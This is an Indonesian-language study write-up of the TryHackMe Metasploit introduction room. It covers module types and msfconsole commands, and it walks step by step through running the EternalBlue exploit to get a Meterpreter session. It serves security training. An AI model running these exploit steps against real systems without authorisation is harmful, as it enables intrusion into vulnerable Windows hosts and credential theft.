# Metasploit Introduction

---

*   **Room Link:** [Metasploit: Introduction](https://tryhackme.com/r/room/metasploitintro)
*   **Category:** Exploitation Basics
*   **Difficulty:** Easy

---

## Task 1: Introduction to Metasploit

Metasploit Framework (MSF) adalah framework open-source exploitation yang paling banyak digunakan di dunia.

**Fungsi Utama:**
*   **Exploitation:** Menyediakan database exploit publik yang siap pakai.
*   **Post-Exploitation:** Membantu fase setelah berhasil masuk (misal: dumping credentials, pivot, dll).
*   **Auxiliary:** Scanning, fuzzing, dan sniffing.

**Versi:**
*   **Metasploit Pro:** Versi berbayar dengan GUI dan fitur automasi.
*   **Metasploit Framework:** Versi komunitas (command-line) yang biasa ada di Kali Linux.

---

## Task 2: Main Components of Metasploit

Metasploit terdiri dari beberapa modul utama. Kita berinteraksi dengannya menggunakan **`msfconsole`**.

**Istilah Penting:**
1.  **Exploit:** Kode yang memanfaatkan celah keamanan (vulnerability) pada target.
2.  **Vulnerability:** Kelemahan pada sistem yang bisa dieksploitasi.
3.  **Payload:** Kode yang dijalankan di sistem target *setelah* exploit berhasil (misal: membuka reverse shell).

**Jenis-Jenis Module:**
*   **Auxiliary:** Tools pendukung seperti scanner, crawler, fuzzer (contoh: `modbus`, `mssql`, `scanner`).
*   **Encoders:** Mengubah kode payload agar tidak terdeteksi antivirus (obfuscation).
*   **Evasion:** Modul khusus untuk menghindari deteksi keamanan.
*   **Exploits:** Database exploit yang dikategorikan berdasarkan target (Windows, Linux, Android, dll).
*   **NOPs (No Operation):** Instruksi CPU "do nothing", biasanya dipakai untuk menjaga stabilitas payload buffer overflow.
*   **Payloads:**
    *   **Singles (Inline):** Payload mandiri (contoh: `shell_reverse_tcp`).
    *   **Stagers:** Payload kecil untuk membuat koneksi awal, lalu mengunduh payload sisanya (stages).
    *   **Stages:** Payload lanjutan yang diunduh oleh stager (contoh: `meterpreter`).
*   **Post:** Modul post-exploitation (setelah berhasil hack), misal untuk mencuri hash password atau enumerasi jaringan internal.

**Q&A Cheatsheet:**
*   Name of code taking advantage of a flaw? -> **Exploit**
*   Name of code that runs on target? -> **Payload**
*   Self-contained payloads? -> **Singles**
*   Is "windows/x64/pingback_reverse_tcp" singles or staged? -> **Singles**

---

## Task 3: Msfconsole

Task ini membahas command dasar di dalam console Metasploit.

**1. Navigasi & Command Dasar:**
*   `help`: Menampilkan menu bantuan.
*   `use [module]`: Memilih module untuk digunakan (misal: `use exploit/windows/smb/ms17_010_eternalblue`).
*   `back`: Kembali ke menu awal (keluar dari konteks module).
*   `info`: Menampilkan informasi detail tentang module yang sedang dipilih.
*   `search [keyword]`: Mencari module berdasarkan kata kunci.
    *   Tips: Bisa cari spesifik, misal `search type:auxiliary telnet`.


![Exploit Rank](../../../Assets/Images/Rank-exploit.png)
> **Note:** Perhatikan kolom **Rank**. Exploit dengan rank *Excellent* paling stabil, sedangkan *Low* berisiko crash pada target.

**2. Konfigurasi Module:**
Setelah memilih module dengan `use`, kita perlu mengaturnya:
*   `show options`: Menampilkan parameter yang perlu diisi.
*   `set [OPTION] [VALUE]`: Mengisi nilai parameter.
    *   Contoh: `set RHOSTS 10.10.10.10` (Target IP).
    *   Contoh: `set LHOST 10.8.1.1` (Attacker IP / VPN IP).
*   `setg [OPTION] [VALUE]`: Mengisi parameter secara **Global** (biar gak perlu isi ulang kalau ganti module).
*   `unset [OPTION]`: Menghapus nilai parameter.

**3. Eksekusi:**
*   `run` atau `exploit`: Menjalankan module.
*   `exploit -z`: Menjalankan exploit dan langsung taruh session di background (biar terminal gak nge-hang).
*   `check`: Mengecek apakah target vulnerable (tanpa menjalankan exploit, cuma scanning).

---

## Task 4: Working with modules

Task ini adalah latihan menggunakan module exploit.

**Skenario:** Kita akan mengeksploitasi layanan yang berjalan di target.

**Langkah-langkah:**

1.  **Pilih Module:**
    Misal kita sudah tahu target rentan terhadap exploit tertentu (contoh: `eternalblue`).
    ```bash
    use exploit/windows/smb/ms17_010_eternalblue
    ```

2.  **Cek Opsi:**
    Lihat apa saja yang perlu diisi.
    ```bash
    show options
    ```
    *   *Perhatikan kolom "Required". Jika "yes", wajib diisi.*

3.  **Set Parameter:**
    *   **RHOSTS** (Remote Hosts): IP target.
        ```bash
        set RHOSTS 10.10.x.x
        ```
    *   **LHOST** (Local Host): IP kita (attacker). Biasanya `tun0` (VPN TryHackMe).
        ```bash
        set LHOST tun0
        ```

4.  **Eksekusi:**
    Jalankan exploit.
    ```bash
    exploit
    ```
    *   Jika berhasil, kita akan mendapatkan **Meterpreter Session**.

5.  **Interaksi:**
    Jika session masuk background, gunakan command `sessions` untuk melihat list, dan `sessions -i [ID]` untuk masuk ke session tersebut.

**Perintah Penting:**
*   `back`: Keluar dari module saat ini.
*   `info`: Melihat deskripsi detail module (author, referensi, opsi).

---

## Task 5: Summary

Room ini adalah pengantar dasar. Poin kunci yang sudah dipelajari:

1.  **Metasploit** adalah framework eksploitasi yang sangat powerful dan modular.
2.  **Msfconsole** adalah interface utama kita.
3.  **Modules** terbagi jadi Exploits, Payloads, Auxiliary, dll.
4.  Workflow standar: `use` -> `set` -> `exploit`.

Langkah selanjutnya adalah memperdalam pemahaman tentang **Payloads** (terutama Meterpreter) dan **Post-Exploitation** di room-room berikutnya.

**Room Completed!** ðŸŽ‰



